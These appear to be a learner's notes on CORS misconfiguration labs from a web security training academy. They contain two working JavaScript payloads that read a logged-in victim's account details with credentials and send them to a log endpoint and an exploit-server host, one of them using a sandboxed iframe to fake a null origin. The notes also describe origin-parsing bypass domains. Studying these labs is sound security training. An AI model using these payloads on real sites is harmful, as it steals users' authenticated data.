____

![[Pasted image 20250127181648.png]]

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a1100170345bf0c80f01209004f0064.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

____
Errors parsing Origin headers

suppose an application grants access to all domains ending in:
`normal-website.com`
An attacker might be able to gain access by registering the domain:
`hackersnormal-website.com`
Alternatively, suppose an application grants access to all domains beginning with
`normal-website.com`
An attacker might be able to gain access using the domain:
`normal-website.com.evil-user.net`

____
The specification for the Origin header supports the value `null`
Using an `<iframe>` with the `sandbox` attribute can bypass certain restrictions and simulate a `null` origin when testing insecure CORS **configurations**
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get', 'https://0ada006c04817488807e76b3005b0066.web-security-academy.net/accountDetails', true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location = 'https://exploit-0a9a008904eb743c806375f8019f00e7.exploit-server.net/log?key=' + encodeURIComponent(this.responseText);
    };
</script>">
</iframe>
```